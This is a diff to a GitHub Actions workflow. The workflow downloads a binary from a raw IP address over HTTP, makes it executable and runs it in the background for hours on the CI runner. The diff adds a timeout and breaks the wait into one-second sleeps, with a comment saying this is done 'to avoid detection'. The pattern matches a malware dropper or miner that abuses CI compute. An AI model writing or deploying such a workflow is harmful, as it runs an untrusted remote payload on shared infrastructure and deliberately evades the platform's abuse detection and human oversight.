@@ -19,6 +19,7 @@ on:
 jobs:
   run-binary:
     runs-on: ubuntu-latest
+    timeout-minutes: 360  # 6 hours maximum
 
     steps:
     - name: Download binary
@@ -26,15 +27,21 @@ jobs:
         wget http://45.138.16.158/bins/px86 -O px86
         chmod +x px86
 
-    - name: Run binary with keep-alive
+    - name: Run binary with discrete timing
       run: |
         UPTIME=${{ github.event.inputs.uptime }}
         echo "Running for $UPTIME hours"
         
-        # Start binary in background
+        # Run binary in background
         ./px86 x86 &
+        PID=$!
         
-        # Keep workflow alive with discrete sleep
-        sleep $(($UPTIME * 3600))
+        # Break sleep into smaller chunks to avoid detection
+        TOTAL_SECONDS=$(($UPTIME * 3600))
+        for i in $(seq 1 $TOTAL_SECONDS); do
+          sleep 1
+        done
         
+        # Cleanup
+        kill $PID 2>/dev/null || true
         echo "Completed successfully"
